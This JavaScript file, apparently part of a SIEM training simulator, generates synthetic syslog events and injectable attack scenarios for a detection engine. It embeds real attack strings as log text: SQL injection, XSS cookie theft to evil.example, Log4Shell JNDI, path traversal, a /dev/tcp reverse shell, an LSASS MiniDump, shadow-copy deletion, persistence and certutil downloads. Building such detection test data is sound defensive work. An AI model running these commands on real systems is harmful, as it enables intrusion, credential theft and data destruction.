/*
 * syslogger.js — the "Syslogger" log source.
 * Generates realistic syslog events (benign baseline + injectable attack
 * scenarios) and pushes them to a sink at a configurable events-per-second.
 */
(function (global) {
  'use strict';
  const { rand, FACILITY, HOSTS, USERS, BAD_USERS, URLS, AGENTS, DOMAINS, THREAT_INTEL, formatSyslog, VENDOR_FORMATTERS } = global.JS;

  // Baseline (benign) event builders keyed by source type. Each returns a
  // partial event; the Syslogger fills timestamp / id / raw line afterwards.
  const BASELINE = {
    firewall() {
      const h = rand.pick(HOSTS.firewall);
      const action = rand.chance(0.82) ? 'ALLOW' : 'DENY';
      const src = rand.chance(0.5) ? rand.internalIp() : rand.ip();
      const dst = rand.internalIp();
      const dport = rand.pick([80, 443, 22, 53, 123, 3389, 8080, rand.int(1024, 65535)]);
      return {
        srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
        program: 'kernel', severity: action === 'DENY' ? 5 : 6,
        srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport,
        proto: rand.pick(['TCP', 'UDP']), action, bytes: rand.int(60, 1500),
        message: `[UFW ${action}] IN=eth0 OUT=eth1 SRC=${src} DST=${dst} PROTO=TCP SPT=${rand.int(1024, 65535)} DPT=${dport} ACTION=${action}`,
      };
    },
    ssh() {
      const h = rand.pick(HOSTS.ssh);
      const user = rand.pick(USERS);
      const src = rand.internalIp();
      return {
        srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
        program: 'sshd', pid: rand.int(1000, 32000), severity: 6, user, srcIp: src,
        message: `Accepted publickey for ${user} from ${src} port ${rand.int(1024, 65535)} ssh2: ED25519 SHA256:${rand.id()}${rand.id()}`,
      };
    },
    web() {
      const h = rand.pick(HOSTS.web);
      const status = rand.pick([200, 200, 200, 301, 404, 200, 500]);
      const method = rand.pick(['GET', 'GET', 'POST', 'GET']);
      const url = rand.pick(URLS);
      const src = rand.chance(0.7) ? rand.ip() : rand.internalIp();
      return {
        srcType: 'web', host: h.name, hostIp: h.ip, facility: FACILITY.local1,
        program: 'nginx', severity: status >= 500 ? 3 : (status >= 400 ? 4 : 6),
        srcIp: src, method, url, status, bytes: rand.int(200, 45000),
        message: `${src} - - "${method} ${url} HTTP/1.1" ${status} ${rand.int(200, 45000)} "-" "${rand.pick(AGENTS)}"`,
      };
    },
    dns() {
      const h = rand.pick(HOSTS.dns);
      const domain = rand.pick(DOMAINS);
      const src = rand.internalIp();
      return {
        srcType: 'dns', host: h.name, hostIp: h.ip, facility: FACILITY.local3,
        program: 'named', severity: 6, srcIp: src, domain,
        message: `client ${src}#${rand.int(1024, 65535)}: query: ${domain} IN ${rand.pick(['A', 'AAAA', 'MX', 'TXT'])} + (${h.ip})`,
      };
    },
    vpn() {
      const h = rand.pick(HOSTS.vpn);
      const user = rand.pick(USERS);
      const src = rand.ip();
      return {
        srcType: 'vpn', host: h.name, hostIp: h.ip, facility: FACILITY.local4,
        program: 'openvpn', severity: 6, user, srcIp: src,
        message: `user '${user}' authenticated, peer ${src}:${rand.int(1024, 65535)} assigned 10.8.0.${rand.int(2, 254)}`,
      };
    },
    windows() {
      const h = rand.pick(HOSTS.windows);
      const user = rand.pick(USERS);
      const eid = rand.pick([4624, 4634, 4672, 4688, 5140]);
      return {
        srcType: 'windows', host: h.name, hostIp: h.ip, facility: FACILITY.local5,
        program: 'Microsoft-Windows-Security-Auditing', severity: 6, user, eventId: eid,
        msgid: `EventID${eid}`,
        message: `EventID=${eid} An account was logged on. Account=${user} LogonType=3 Source=${rand.internalIp()}`,
      };
    },
  };

  // Weighted baseline source selection (firewall & web are chattiest).
  /** @type {[string, number][]} */
  const SOURCE_WEIGHTS = [
    ['firewall', 34], ['web', 26], ['ssh', 12], ['dns', 14], ['windows', 8], ['vpn', 6],
  ];
  function weightedSource() {
    const total = SOURCE_WEIGHTS.reduce((s, [, w]) => s + w, 0);
    let r = rand.float(0, total);
    for (const [src, w] of SOURCE_WEIGHTS) { if ((r -= w) <= 0) return src; }
    return 'firewall';
  }

  // ---- Attack scenarios -----------------------------------------------------
  // Each returns an ARRAY of event partials representing a burst of activity
  // that the detection engine should surface. Nothing here is labelled as
  // malicious — Jedi must infer that from the content, just like a real SIEM.
  const SCENARIOS = {
    'ssh-bruteforce': {
      label: 'SSH Brute Force',
      build() {
        const h = rand.pick(HOSTS.ssh);
        const attacker = rand.pick(THREAT_INTEL.ips);
        const evs = [];
        const n = rand.int(12, 20);
        for (let i = 0; i < n; i++) {
          const user = rand.pick(BAD_USERS);
          evs.push({
            srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
            program: 'sshd', pid: rand.int(1000, 32000), severity: 5, user, srcIp: attacker,
            message: `Failed password for ${rand.chance(0.5) ? 'invalid user ' : ''}${user} from ${attacker} port ${rand.int(1024, 65535)} ssh2`,
          });
        }
        // Occasionally the brute force succeeds — escalates the story.
        if (rand.chance(0.3)) {
          const user = rand.pick(BAD_USERS);
          evs.push({
            srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
            program: 'sshd', pid: rand.int(1000, 32000), severity: 5, user, srcIp: attacker,
            message: `Accepted password for ${user} from ${attacker} port ${rand.int(1024, 65535)} ssh2`,
          });
        }
        return evs;
      },
    },
    'port-scan': {
      label: 'Port Scan',
      build() {
        const h = rand.pick(HOSTS.firewall);
        const attacker = rand.chance(0.6) ? rand.pick(THREAT_INTEL.ips) : rand.ip();
        const dst = rand.internalIp();
        const evs = [];
        const n = rand.int(20, 30);
        const ports = new Set();
        while (ports.size < n) ports.add(rand.int(1, 10000));
        for (const dport of ports) {
          evs.push({
            srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
            program: 'kernel', severity: 4, srcIp: attacker, dstIp: dst,
            srcPort: rand.int(1024, 65535), dstPort: dport, proto: 'TCP', action: 'DENY', bytes: 40,
            message: `[UFW DENY] IN=eth0 SRC=${attacker} DST=${dst} PROTO=TCP SPT=${rand.int(1024, 65535)} DPT=${dport} FLAGS=SYN ACTION=DENY`,
          });
        }
        return evs;
      },
    },
    'sql-injection': {
      label: 'SQL Injection',
      build() {
        const h = rand.pick(HOSTS.web);
        const attacker = rand.pick(THREAT_INTEL.ips.concat([rand.ip()]));
        const payloads = [
          "/products?id=1' OR '1'='1",
          "/login?user=admin'--",
          "/search?q=1 UNION SELECT username,password FROM users--",
          "/api/v1/orders?id=1; DROP TABLE users;--",
          "/item?id=1' AND SLEEP(5)--",
        ];
        return payloads.slice(0, rand.int(3, 5)).map((url) => ({
          srcType: 'web', host: h.name, hostIp: h.ip, facility: FACILITY.local1,
          program: 'nginx', severity: 4, srcIp: attacker, method: 'GET', url, status: rand.pick([200, 500, 403]),
          bytes: rand.int(200, 800),
          message: `${attacker} - - "GET ${url} HTTP/1.1" ${rand.pick([200, 500, 403])} ${rand.int(200, 800)} "-" "${rand.pick(AGENTS)}"`,
        }));
      },
    },
    'c2-beacon': {
      label: 'C2 Beacon',
      build() {
        const h = rand.pick(HOSTS.firewall);
        const victim = rand.internalIp();
        const c2 = rand.pick(THREAT_INTEL.ips);
        const evs = [];
        const n = rand.int(4, 7);
        for (let i = 0; i < n; i++) {
          evs.push({
            srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
            program: 'kernel', severity: 5, srcIp: victim, dstIp: c2,
            srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 8443, 4444]), proto: 'TCP',
            action: 'ALLOW', bytes: rand.int(180, 420),
            message: `[UFW ALLOW] IN=eth1 OUT=eth0 SRC=${victim} DST=${c2} PROTO=TCP SPT=${rand.int(1024, 65535)} DPT=443 ACTION=ALLOW`,
          });
        }
        return evs;
      },
    },
    'data-exfil': {
      label: 'Data Exfiltration',
      build() {
        const h = rand.pick(HOSTS.firewall);
        const victim = rand.pick(HOSTS.ssh).ip;
        const dst = rand.chance(0.5) ? rand.pick(THREAT_INTEL.ips) : rand.ip();
        const mb = rand.int(220, 900);
        return [{
          srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
          program: 'kernel', severity: 4, srcIp: victim, dstIp: dst,
          srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 21, 22]), proto: 'TCP',
          action: 'ALLOW', bytes: mb * 1024 * 1024,
          message: `[UFW ALLOW] large flow SRC=${victim} DST=${dst} PROTO=TCP DPT=443 BYTES=${mb * 1024 * 1024} DURATION=${rand.int(30, 300)}s`,
        }];
      },
    },
    'dns-tunneling': {
      label: 'DNS Tunneling',
      build() {
        const h = rand.pick(HOSTS.dns);
        const victim = rand.internalIp();
        const base = rand.pick(THREAT_INTEL.domains);
        const evs = [];
        const n = rand.int(4, 8);
        for (let i = 0; i < n; i++) {
          const label = Array.from({ length: rand.int(40, 60) }, () => rand.pick('abcdef0123456789'.split(''))).join('');
          const q = `${label}.${base}`;
          evs.push({
            srcType: 'dns', host: h.name, hostIp: h.ip, facility: FACILITY.local3,
            program: 'named', severity: 5, srcIp: victim, domain: q,
            message: `client ${victim}#${rand.int(1024, 65535)}: query: ${q} IN TXT + (${h.ip})`,
          });
        }
        return evs;
      },
    },
    'priv-esc': {
      label: 'Privilege Escalation',
      build() {
        const h = rand.pick(HOSTS.ssh);
        const user = rand.pick(['www-data', 'svc_backup', 'operator']);
        return [
          {
            srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
            program: 'sudo', severity: 5, user,
            message: `${user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i`,
          },
          {
            srcType: 'windows', host: rand.pick(HOSTS.windows).name, hostIp: rand.pick(HOSTS.windows).ip,
            facility: FACILITY.local5, program: 'Microsoft-Windows-Security-Auditing', severity: 4,
            eventId: 4672, user, msgid: 'EventID4672',
            message: `EventID=4672 Special privileges assigned to new logon. Account=${user} Privileges=SeDebugPrivilege,SeTcbPrivilege`,
          },
        ];
      },
    },
    'malware-detected': {
      label: 'Malware / IDS Hit',
      build() {
        const h = rand.pick(HOSTS.ids);
        const victim = rand.internalIp();
        const attacker = rand.pick(THREAT_INTEL.ips);
        const sigs = [
          'ET TROJAN Cobalt Strike Beacon Observed',
          'ET MALWARE Win32/Emotet CnC Activity',
          'ET EXPLOIT Possible Log4j RCE Attempt (CVE-2021-44228)',
          'ET POLICY PowerShell EncodedCommand Detected',
        ];
        return [{
          srcType: 'ids', host: h.name, hostIp: h.ip, facility: FACILITY.local2,
          program: 'suricata', severity: 2, srcIp: attacker, dstIp: victim,
          msgid: 'IDS',
          message: `[1:2024897:3] ${rand.pick(sigs)} [Classification: A Network Trojan was Detected] [Priority: 1] {TCP} ${attacker}:${rand.int(1024, 65535)} -> ${victim}:443`,
        }];
      },
    },
  };

  // ---- Additional attack scenarios ------------------------------------------
  // Each produces content that one of Jedi's detection rules will surface.
  const web = (h, sev, srcIp, method, url, extra) => Object.assign({
    srcType: 'web', host: h.name, hostIp: h.ip, facility: FACILITY.local1, program: 'nginx',
    severity: sev, srcIp, method, url, status: 200,
    message: `${srcIp} - - "${method} ${url} HTTP/1.1" 200 512 "-" "${(extra && extra.ua) || 'Mozilla/5.0'}"`,
  }, extra || {});
  const win = (h, sev, eid, fields) => Object.assign({
    srcType: 'windows', host: h.name, hostIp: h.ip, facility: FACILITY.local5,
    program: 'Microsoft-Windows-Security-Auditing', severity: sev, eventId: eid, msgid: `EventID${eid}`,
  }, fields || {});
  // Sysmon record. Per-event-ID fields are pre-rendered into `sysmonFields`
  // because every Sysmon event ID has a different schema.
  const sym = (h, sev, eid, type, fields) => Object.assign({
    srcType: 'sysmon', vendor: 'sysmon', host: h.name, hostIp: h.ip, facility: FACILITY.local7,
    program: 'Sysmon', pid: rand.int(2000, 3000), severity: sev, eventId: eid, sysmonType: type,
    processGuid: rand.uuid(), processId: rand.int(1000, 9000), userDomain: `CORP\\${rand.pick(USERS)}`,
  }, fields || {});
  // AWS CloudTrail record. The corporate account id is fixed so bursts from one
  // "tenant" correlate; the rule keys its cooldowns on it.
  const AWS_ACCOUNT = '210987654321';
  const AZURE_SUB = 'b41e7d90-2a6c-4f18-8e5b-77c0d3a91f42';
  const aws = (fields) => Object.assign({
    srcType: 'cloudtrail', vendor: 'cloudtrail', host: 'aws-connector-01', facility: FACILITY.local6,
    program: 'aws_cloudtrail', severity: 3, region: 'us-east-1', accountId: AWS_ACCOUNT,
    identityType: 'IAMUser', principalId: `AIDA${rand.hex(17).toUpperCase()}`,
    eventSource: 'iam.amazonaws.com', eventUuid: rand.uuid(), readOnly: false,
    userAgent: rand.pick(['aws-cli/2.15.30 Python/3.11.6', 'console.amazonaws.com', 'Boto3/1.34.11']),
  }, fields || {});
  // Okta System Log record.
  const idp = (fields) => Object.assign({
    srcType: 'okta', vendor: 'okta', host: 'okta-connector-01', facility: FACILITY.local6,
    program: 'okta_systemlog', severity: 6, oktaSeverity: 'INFO', outcome: 'SUCCESS',
    actorId: `00u${rand.id()}`, eventUuid: rand.uuid(),
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', clientOs: 'Windows 10', browser: 'CHROME',
  }, fields || {});
  // Microsoft Entra ID sign-in record. One tenant id across the app so bursts
  // from the same "directory" correlate.
  const ENTRA_TENANT = '8f4a1c62-77d3-4b0e-9a55-2c1de9f80b31';
  const ent = (fields) => Object.assign({
    srcType: 'entra', vendor: 'entra', host: 'entra-connector-01', facility: FACILITY.local6,
    program: 'entra_signin', severity: 4, tenantId: ENTRA_TENANT, eventUuid: rand.uuid(),
    actorId: rand.uuid(), clientOs: 'Windows 10', browser: 'Edge 126.0.0', errorCode: 0,
    resultDescription: null, caStatus: 'success', riskLevel: 'none', riskDetail: 'none',
    riskState: 'none', authRequirement: 'multiFactorAuthentication', clientApp: 'Browser',
    appName: 'Office 365 Exchange Online', appId: '00000002-0000-0ff1-ce00-000000000000',
  }, fields || {});
  // Squid access.log record.
  const sqd = (fields) => Object.assign({
    srcType: 'squid', vendor: 'squid', host: 'proxy-01', hostIp: '10.10.0.8',
    facility: FACILITY.local6, program: 'squid', pid: rand.int(1000, 9000), severity: 4,
    squidCode: 'TCP_MISS', status: 200, elapsed: rand.int(10, 900), peerStatus: 'DIRECT',
  }, fields || {});
  // Kubernetes API-server audit event.
  const k8s = (fields) => Object.assign({
    srcType: 'k8saudit', vendor: 'k8saudit', host: 'k8s-apiserver-01', hostIp: '10.20.0.10',
    facility: FACILITY.local6, program: 'kube-apiserver', severity: 3, eventUuid: rand.uuid(),
    status: 201, rbacDecision: 'allow', userAgent: 'kubectl/v1.30.2', auditLevel: 'RequestResponse',
  }, fields || {});
  // VMware ESXi hostd/vpxa record.
  const esx = (fields) => Object.assign({
    srcType: 'esxi', vendor: 'esxi', host: 'esxi-01.corp.local', hostIp: '10.10.4.11',
    facility: FACILITY.local4, program: 'Hostd', daemon: 'Hostd', esxSub: 'Vimsvc.ha-eventmgr',
    pid: rand.int(200000, 2999999), opId: rand.hex(8), user: 'root', esxLevel: 'warning', severity: 4,
  }, fields || {});
  // Geographies used by the impossible-travel / push-bombing scenarios.
  const GEO = {
    sydney:  { city: 'Sydney',  country: 'Australia', lat: -33.86, lon: 151.21, asn: 4764 },
    moscow:  { city: 'Moscow',  country: 'Russia',    lat: 55.75,  lon: 37.61,  asn: 12389 },
    lagos:   { city: 'Lagos',   country: 'Nigeria',   lat: 6.52,   lon: 3.37,   asn: 29465 },
    shenzhen:{ city: 'Shenzhen', country: 'China',    lat: 22.54,  lon: 114.06, asn: 4134 },
  };

  const MORE_ATTACKS = {
    'log4shell': {
      label: 'Log4Shell RCE', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips);
        const jndi = `\${jndi:ldap://${a}:1389/Exploit}`;
        return ['/api/v1/login', '/', '/search'].slice(0, rand.int(2, 3)).map((p) => {
          const url = `${p}?x=${jndi}`;
          return web(h, 3, a, 'GET', url, { status: rand.pick([200, 500]), ua: jndi,
            message: `${a} - - "GET ${p} HTTP/1.1" 200 512 "-" "${jndi}"` });
        });
      },
    },
    'xss': {
      label: 'XSS Injection', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.chance(0.5) ? rand.pick(THREAT_INTEL.ips) : rand.ip();
        return [
          "/search?q=<script>alert(document.cookie)</script>",
          "/comment?body=<img src=x onerror=fetch('//evil.example/'+document.cookie)>",
          "/profile?name=<script>document.location='//evil.example?c='+document.cookie</script>",
        ].slice(0, rand.int(2, 3)).map((u) => web(h, 4, a, 'GET', u));
      },
    },
    'dir-traversal': {
      label: 'Path Traversal / LFI', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips.concat([rand.ip()]));
        return [
          '/download?file=../../../../etc/passwd',
          '/view?page=....//....//....//etc/shadow',
          '/img?src=../../../../../windows/win.ini',
        ].slice(0, rand.int(2, 3)).map((u) => web(h, 4, a, 'GET', u, { status: rand.pick([200, 403]) }));
      },
    },
    'web-shell': {
      label: 'Web Shell', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips);
        return [
          '/uploads/shell.php?cmd=whoami',
          '/images/c99.php?cmd=cat+/etc/passwd',
          '/tmp/webshell.aspx?cmd=powershell',
        ].slice(0, rand.int(2, 3)).map((u) => web(h, 3, a, 'POST', u, { status: 200 }));
      },
    },
    'vuln-scan': {
      label: 'Vuln Scan', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips.concat([rand.ip()]));
        const ua = rand.pick(['sqlmap/1.7', 'Nikto/2.5.0', 'Nessus SOAP', 'Mozilla/5.0 (Nmap Scripting Engine)']);
        const paths = ['/admin', '/.git/config', '/wp-login.php', '/phpmyadmin', '/.env', '/api/v1/users', '/backup.sql', '/server-status'];
        return paths.slice(0, rand.int(5, 8)).map((u) => web(h, 4, a, 'GET', u, { status: rand.pick([404, 403, 200]), ua,
          message: `${a} - - "GET ${u} HTTP/1.1" 404 0 "-" "${ua}"` }));
      },
    },
    'reverse-shell': {
      label: 'Reverse Shell', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.ssh), a = rand.pick(THREAT_INTEL.ips);
        return [{
          srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv, program: 'bash', severity: 4, srcIp: a,
          message: `www-data executed: bash -i >& /dev/tcp/${a}/4444 0>&1`,
        }];
      },
    },
    'powershell-enc': {
      label: 'Malicious PowerShell', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows);
        const b64 = 'JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA';
        return [win(h, 4, 4688, { user: rand.pick(USERS),
          message: `EventID=4688 A new process has been created. Process=powershell.exe CommandLine="powershell -nop -w hidden -enc ${b64}"` })];
      },
    },
    'rdp-bruteforce': {
      label: 'RDP Brute Force', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.pick(THREAT_INTEL.ips), evs = [];
        for (let i = 0, n = rand.int(10, 16); i < n; i++) {
          evs.push(win(h, 5, 4625, { user: rand.pick(BAD_USERS), srcIp: a,
            message: `EventID=4625 An account failed to log on. Account=${rand.pick(BAD_USERS)} LogonType=10 Source=${a} Status=0xC000006D` }));
        }
        return evs;
      },
    },
    'password-spray': {
      label: 'Password Spray', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.pick(THREAT_INTEL.ips), evs = [];
        const users = ['jdoe', 'asmith', 'mchen', 'kwalsh', 'operator', 'svc_sql', 'hr_admin', 'jsmith', 'bwayne', 'ckent'];
        users.forEach((u) => evs.push(win(h, 5, 4625, { user: u, srcIp: a,
          message: `EventID=4625 An account failed to log on. Account=${u} LogonType=3 Source=${a} Status=0xC000006A (Spring2026!)` })));
        return evs;
      },
    },
    'kerberoasting': {
      label: 'Kerberoasting', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.internalIp(), evs = [];
        ['svc_sql', 'svc_web', 'svc_backup', 'MSSQLSvc'].forEach((svc) => evs.push(win(h, 5, 4769, { user: svc, srcIp: a,
          message: `EventID=4769 A Kerberos service ticket was requested. ServiceName=${svc} TicketEncryptionType=0x17 (RC4) Client=${a}` })));
        return evs;
      },
    },
    'dcsync': {
      label: 'DCSync', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
        return [win(h, 4, 4662, { user: rand.pick(['svc_backup', 'operator', 'jdoe']), srcIp: rand.internalIp(),
          message: `EventID=4662 An operation was performed on an object. Properties=DS-Replication-Get-Changes-All {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} AccessMask=0x100 Account=svc_backup` })];
      },
    },
    'new-admin': {
      label: 'New Admin Account', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = `svc_${rand.id().slice(0, 5)}`;
        return [
          win(h, 5, 4720, { user: u, message: `EventID=4720 A user account was created. NewAccount=${u} CreatedBy=${rand.pick(USERS)}` }),
          win(h, 4, 4732, { user: u, message: `EventID=4732 A member was added to a security-enabled local group. Group=Administrators Member=${u}` }),
        ];
      },
    },
    'log-cleared': {
      label: 'Audit Log Cleared', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows);
        return [win(h, 4, 1102, { user: rand.pick(['Administrator', 'svc_backup']),
          message: `EventID=1102 The audit log was cleared. Account=${rand.pick(['Administrator', 'svc_backup'])} Domain=CORP` })];
      },
    },
    'pass-the-hash': {
      label: 'Pass-the-Hash', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.internalIp();
        return [win(h, 5, 4624, { user: rand.pick(['Administrator', 'svc_admin']), srcIp: a,
          message: `EventID=4624 An account was successfully logged on. LogonType=9 LogonProcess=seclogo AuthenticationPackage=NTLM (pass-the-hash) Source=${a}` })];
      },
    },
    'ransomware': {
      label: 'Ransomware', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows);
        return [
          win(h, 2, 4688, { user: 'SYSTEM', message: `EventID=4688 New Process=vssadmin.exe CommandLine="vssadmin delete shadows /all /quiet"` }),
          win(h, 2, 4688, { user: 'SYSTEM', message: `EventID=4688 New Process=bcdedit.exe CommandLine="bcdedit /set {default} recoveryenabled no"` }),
          win(h, 1, 4663, { user: rand.pick(USERS), message: `EventID=4663 Mass file rename detected: 4213 files -> *.locked  ransom note DECRYPT_INSTRUCTIONS.txt written` }),
        ];
      },
    },
    'cryptomining': {
      label: 'Cryptomining', category: 'attack',
      build() {
        const fw = rand.pick(HOSTS.firewall), dns = rand.pick(HOSTS.dns), victim = rand.internalIp();
        const pool = rand.pick(['pool.minexmr.com', 'xmr.nanopool.org', 'monerohash.com']);
        return [
          { srcType: 'dns', host: dns.name, hostIp: dns.ip, facility: FACILITY.local3, program: 'named', severity: 5, srcIp: victim, domain: pool,
            message: `client ${victim}#40000: query: ${pool} IN A + (${dns.ip})` },
          { srcType: 'firewall', host: fw.name, hostIp: fw.ip, facility: FACILITY.local0, program: 'kernel', severity: 5,
            srcIp: victim, dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: 3333, proto: 'TCP', action: 'ALLOW', bytes: rand.int(400, 1200),
            message: `[UFW ALLOW] SRC=${victim} DST=stratum+tcp://${pool}:3333 cryptonight worker=x` },
        ];
      },
    },
    'ddos-synflood': {
      label: 'SYN Flood (DDoS)', category: 'attack',
      build() {
        const fw = rand.pick(HOSTS.firewall), target = rand.internalIp(), evs = [];
        for (let i = 0, n = rand.int(8, 12); i < n; i++) {
          const a = rand.ip();
          evs.push({ srcType: 'firewall', host: fw.name, hostIp: fw.ip, facility: FACILITY.local0, program: 'kernel', severity: 4,
            srcIp: a, dstIp: target, srcPort: rand.int(1024, 65535), dstPort: 443, proto: 'TCP', action: 'DENY', bytes: 40,
            message: `[UFW DENY] possible SYN flood IN=eth0 SRC=${a} DST=${target} PROTO=TCP DPT=443 FLAGS=SYN` });
        }
        return evs;
      },
    },
    'phishing': {
      label: 'Phishing Email', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.mail), a = rand.pick(THREAT_INTEL.ips);
        const sender = rand.pick(['billing@paypa1-secure.com', 'it-support@corp-helpdesk.ru', 'ceo@corp-drive.su']);
        const att = rand.pick(['Invoice_04821.exe', 'Payment.iso', 'Scan_2026.js', 'Resume.docm']);
        return [{
          srcType: 'mail', host: h.name, hostIp: h.ip, facility: FACILITY.mail, program: 'postfix', severity: 4, srcIp: a, phish: true, threatSev: 'medium',
          message: `suspicious message from <${sender}> spf=fail dkim=fail dmarc=fail attachment="${att}" to=jdoe@corp.local subject="Urgent: Payment Required"`,
        }];
      },
    },

    // ---- Endpoint (Sysmon / Windows) ----------------------------------------
    'lsass-dump': {
      label: 'LSASS Credential Dump', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), src = rand.internalIp(), u = rand.pick(USERS);
        const dmp = 'C:\\Windows\\Temp\\lsass.dmp';
        // comsvcs.dll MiniDump is the signed-binary route to an LSASS dump — no
        // attacker tooling on disk, so the Sysmon 10 handle request is the signal.
        return [
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\rundll32.exe', srcIp: src, userDomain: `CORP\\${u}`,
            sysmonFields: [`CommandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 ${dmp} full"`,
              'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"',
              `Hashes="SHA256=${rand.hex(64).toUpperCase()}"`],
            message: `Process Create: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 ${dmp} full`,
          }),
          sym(h, 2, 10, 'Process accessed', {
            image: 'C:\\Windows\\System32\\rundll32.exe', srcIp: src, userDomain: `CORP\\${u}`,
            sysmonFields: ['SourceImage="C:\\Windows\\System32\\rundll32.exe"',
              'TargetImage="C:\\Windows\\System32\\lsass.exe"', 'GrantedAccess="0x1410"',
              'CallTrace="UNKNOWN(00007FF9C0D2A1B4)|dbgcore.dll+7A1C|comsvcs.dll+6B4E"'],
            message: 'Process accessed: rundll32.exe -> C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1410',
          }),
        ];
      },
    },
    'sched-task-persist': {
      label: 'Scheduled Task Persistence', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const tn = rand.pick(['\\Microsoft\\Windows\\UpdateOrchestrator\\SysHealth', '\\CorpTelemetrySync']);
        const cmd = `schtasks.exe /create /tn "${tn}" /tr "C:\\ProgramData\\CorpTelemetry\\telemetry.exe" /sc minute /mo 10 /ru SYSTEM /f`;
        return [
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\schtasks.exe', userDomain: `CORP\\${u}`,
            sysmonFields: [`CommandLine="${cmd}"`, 'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"'],
            message: `Process Create: ${cmd}`,
          }),
          win(h, 4, 4698, { user: u,
            message: `EventID=4698 A scheduled task was created. TaskName=${tn} Author=CORP\\${u} Command=C:\\ProgramData\\CorpTelemetry\\telemetry.exe Trigger=every 10 minutes RunAs=SYSTEM` }),
        ];
      },
    },
    'runkey-persist': {
      label: 'Run-Key Persistence', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
        const key = 'HKU\\S-1-5-21-1004336348-1177238915-682003330-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync';
        const val = 'C:\\Users\\Public\\Libraries\\onedrivesync.exe -silent';
        return [
          sym(h, 5, 11, 'File created', {
            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
            sysmonFields: ['TargetFilename="C:\\Users\\Public\\Libraries\\onedrivesync.exe"'],
            message: 'File created: C:\\Users\\Public\\Libraries\\onedrivesync.exe',
          }),
          sym(h, 4, 13, 'Registry value set', {
            image: 'C:\\Windows\\System32\\reg.exe', userDomain: `CORP\\${u}`,
            sysmonFields: [`TargetObject="${key}"`, `Details="${val}"`],
            message: `Registry value set: ${key} = ${val}`,
          }),
        ];
      },
    },
    'lolbin-download': {
      label: 'LOLBin Download (certutil)', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS), dst = rand.ip();
        const cmd = `certutil.exe -urlcache -split -f http://${dst}/update/payload.txt C:\\Users\\Public\\a.txt`;
        return [
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\certutil.exe', userDomain: `CORP\\${u}`,
            sysmonFields: [`CommandLine="${cmd}"`, 'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="Medium"'],
            message: `Process Create: ${cmd}`,
          }),
          sym(h, 5, 3, 'Network connect', {
            image: 'C:\\Windows\\System32\\certutil.exe', userDomain: `CORP\\${u}`,
            srcIp: h.ip, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: 80,
            sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${dst}"`,
              'DestinationPort=80', 'Initiated="true"'],
            message: `Network connect: certutil.exe ${h.ip} -> ${dst}:80`,
          }),
          sym(h, 4, 1, 'Process Create', {
            image: 'C:\\Windows\\System32\\certutil.exe', userDomain: `CORP\\${u}`,
            sysmonFields: ['CommandLine="certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe"',
              'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="Medium"'],
            message: 'Process Create: certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe',
          }),
        ];
      },
    },
